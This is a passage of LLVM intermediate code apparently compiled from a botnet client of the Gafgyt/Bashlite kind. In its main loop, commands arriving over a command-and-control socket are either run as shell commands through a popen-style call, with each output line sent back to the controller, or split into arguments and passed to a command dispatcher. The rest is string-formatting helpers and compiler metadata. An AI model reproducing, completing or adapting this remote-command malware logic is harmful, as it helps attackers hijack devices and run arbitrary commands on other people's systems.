  store i8 %366, i8* %367, align 1
  %368 = load i8*, i8** %27, align 8
  %369 = getelementptr inbounds i8, i8* %368, i32 1
  store i8* %369, i8** %27, align 8
  br label %357, !llvm.loop !59

370:                                              ; preds = %357
  %371 = load i8*, i8** %26, align 8
  %372 = call i32 @strcmp(i8* %371, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.143, i64 0, i64 0)) #11
  %373 = icmp eq i32 %372, 0
  br i1 %373, label %374, label %400

374:                                              ; preds = %370
  %375 = call i32 @listFork()
  %376 = icmp ne i32 %375, 0
  br i1 %376, label %377, label %378

377:                                              ; preds = %374
  br label %178, !llvm.loop !55

378:                                              ; preds = %374
  %379 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %379, i8 0, i64 1024, i1 false)
  %380 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i64 0, i64 0
  %381 = load i8*, i8** %24, align 8
  %382 = call i32 (i8*, i8*, ...) @szprintf(i8* %380, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.144, i64 0, i64 0), i8* %381)
  %383 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i64 0, i64 0
  %384 = call i32 @fdpopen(i8* %383, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i64 0, i64 0))
  store i32 %384, i32* %29, align 4
  br label %385

385:                                              ; preds = %390, %378
  %386 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i64 0, i64 0
  %387 = load i32, i32* %29, align 4
  %388 = call i8* @fdgets(i8* %386, i32 1024, i32 %387)
  %389 = icmp ne i8* %388, null
  br i1 %389, label %390, label %397

390:                                              ; preds = %385
  %391 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i64 0, i64 0
  call void @trim(i8* %391)
  %392 = load i32, i32* @mainCommSock, align 4
  %393 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i64 0, i64 0
  %394 = call i32 (i32, i8*, ...) @sockprintf(i32 %392, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.145, i64 0, i64 0), i8* %393)
  %395 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %395, i8 0, i64 1024, i1 false)
  %396 = call i32 @sleep(i32 1)
  br label %385, !llvm.loop !60

397:                                              ; preds = %385
  %398 = load i32, i32* %29, align 4
  %399 = call i32 @fdpclose(i32 %398)
  call void @exit(i32 0) #16
  unreachable

400:                                              ; preds = %370
  store i32 1, i32* %31, align 4
  %401 = load i8*, i8** %24, align 8
  %402 = call i8* @strtok(i8* %401, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i64 0, i64 0)) #12
  store i8* %402, i8** %32, align 8
  %403 = load i8*, i8** %26, align 8
  %404 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 0
  store i8* %403, i8** %404, align 16
  br label %405

405:                                              ; preds = %436, %400
  %406 = load i8*, i8** %32, align 8
  %407 = icmp ne i8* %406, null
  br i1 %407, label %408, label %438

408:                                              ; preds = %405
  %409 = load i8*, i8** %32, align 8
  %410 = load i8, i8* %409, align 1
  %411 = zext i8 %410 to i32
  %412 = icmp ne i32 %411, 10
  br i1 %412, label %413, label %436

413:                                              ; preds = %408
  %414 = load i8*, i8** %32, align 8
  %415 = call i64 @strlen(i8* %414) #11
  %416 = add i64 %415, 1
  %417 = call noalias align 16 i8* @malloc(i64 %416) #12
  %418 = load i32, i32* %31, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %419
  store i8* %417, i8** %420, align 8
  %421 = load i32, i32* %31, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %422
  %424 = load i8*, i8** %423, align 8
  %425 = load i8*, i8** %32, align 8
  %426 = call i64 @strlen(i8* %425) #11
  %427 = add i64 %426, 1
  call void @llvm.memset.p0i8.i64(i8* align 1 %424, i8 0, i64 %427, i1 false)
  %428 = load i32, i32* %31, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %429
  %431 = load i8*, i8** %430, align 8
  %432 = load i8*, i8** %32, align 8
  %433 = call i8* @strcpy(i8* %431, i8* %432) #12
  %434 = load i32, i32* %31, align 4
  %435 = add nsw i32 %434, 1
  store i32 %435, i32* %31, align 4
  br label %436

436:                                              ; preds = %413, %408
  %437 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i64 0, i64 0)) #12
  store i8* %437, i8** %32, align 8
  br label %405, !llvm.loop !61

438:                                              ; preds = %405
  %439 = load i32, i32* %31, align 4
  %440 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 0
  call void @processCmd(i32 %439, i8** %440)
  %441 = load i32, i32* %31, align 4
  %442 = icmp sgt i32 %441, 1
  br i1 %442, label %443, label %457

443:                                              ; preds = %438
  store i32 1, i32* %33, align 4
  store i32 1, i32* %33, align 4
  br label %444

444:                                              ; preds = %453, %443
  %445 = load i32, i32* %33, align 4
  %446 = load i32, i32* %31, align 4
  %447 = icmp slt i32 %445, %446
  br i1 %447, label %448, label %456

448:                                              ; preds = %444
  %449 = load i32, i32* %33, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %450
  %452 = load i8*, i8** %451, align 8
  call void @free(i8* %452) #12
  br label %453

453:                                              ; preds = %448
  %454 = load i32, i32* %33, align 4
  %455 = add nsw i32 %454, 1
  store i32 %455, i32* %33, align 4
  br label %444, !llvm.loop !62

456:                                              ; preds = %444
  br label %457

457:                                              ; preds = %456, %438
  br label %458

458:                                              ; preds = %457, %270
  br label %178, !llvm.loop !55

459:                                              ; preds = %178
  br label %168
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #3

declare i32 @prctl(...) #5

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #5

; Function Attrs: nounwind
declare i8* @getcwd(i8*, i64) #3

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #5

; Function Attrs: nounwind readonly willreturn
declare i32 @strcasecmp(i8*, i8*) #1

declare i32 @fclose(%struct._IO_FILE*) #5

declare i32 @fputs(i8*, %struct._IO_FILE*) #5

; Function Attrs: nounwind
declare i32 @setsid() #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @prints(i8** %0, i8* %1, i32 %2, i32 %3) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

15:                                               ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

17:                                               ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

21:                                               ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

24:                                               ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17, !llvm.loop !63

27:                                               ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

31:                                               ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

32:                                               ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

36:                                               ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

41:                                               ; preds = %40, %36
  br label %42

42:                                               ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

46:                                               ; preds = %42
  br label %47

47:                                               ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

50:                                               ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** %51, i32 %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

55:                                               ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47, !llvm.loop !64

58:                                               ; preds = %47
  br label %59

59:                                               ; preds = %58, %42
  br label %60

60:                                               ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

64:                                               ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** %65, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

71:                                               ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60, !llvm.loop !65

74:                                               ; preds = %60
  br label %75

75:                                               ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

78:                                               ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** %79, i32 %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

83:                                               ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75, !llvm.loop !66

86:                                               ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @printi(i8** %0, i32 %1, i32 %2, i32 %3, i32 %4, i32 %5, i32 %6) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

25:                                               ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %102

33:                                               ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

36:                                               ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

39:                                               ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

42:                                               ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

45:                                               ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

50:                                               ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

53:                                               ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

59:                                               ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

65:                                               ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50, !llvm.loop !67

74:                                               ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

77:                                               ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

80:                                               ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %90

84:                                               ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %85, i32 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

90:                                               ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

93:                                               ; preds = %90, %84
  br label %94

94:                                               ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** %96, i8* %97, i32 %98, i32 %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

102:                                              ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @printchar(i8** %0, i32 %1) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

7:                                                ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

15:                                               ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

18:                                               ; preds = %15, %7
  ret void
}

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nofree nosync nounwind willreturn }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { nounwind returns_twice "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { noreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #8 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #9 = { argmemonly nofree nounwind willreturn }
attributes #10 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #11 = { nounwind readonly willreturn }
attributes #12 = { nounwind }
attributes #13 = { nounwind returns_twice }
attributes #14 = { noreturn }
attributes #15 = { nounwind readnone willreturn }
attributes #16 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
!28 = distinct !{!28, !7}
!29 = distinct !{!29, !7}
!30 = distinct !{!30, !7}
!31 = distinct !{!31, !7}
!32 = distinct !{!32, !7}
!33 = distinct !{!33, !7}
!34 = distinct !{!34, !7}
!35 = distinct !{!35, !7}
!36 = distinct !{!36, !7}
!37 = distinct !{!37, !7}
!38 = distinct !{!38, !7}
!39 = distinct !{!39, !7}
!40 = distinct !{!40, !7}
!41 = distinct !{!41, !7}
!42 = distinct !{!42, !7}
!43 = distinct !{!43, !7}
!44 = distinct !{!44, !7}
!45 = distinct !{!45, !7}
!46 = distinct !{!46, !7}
!47 = distinct !{!47, !7}
!48 = distinct !{!48, !7}
!49 = distinct !{!49, !7}
!50 = distinct !{!50, !7}
!51 = distinct !{!51, !7}
!52 = distinct !{!52, !7}
!53 = distinct !{!53, !7}
!54 = distinct !{!54, !7}
!55 = distinct !{!55, !7}
!56 = distinct !{!56, !7}
!57 = distinct !{!57, !7}
!58 = distinct !{!58, !7}
!59 = distinct !{!59, !7}
!60 = distinct !{!60, !7}
!61 = distinct !{!61, !7}
!62 = distinct !{!62, !7}
!63 = distinct !{!63, !7}
!64 = distinct !{!64, !7}
!65 = distinct !{!65, !7}
!66 = distinct !{!66, !7}
!67 = distinct !{!67, !7}
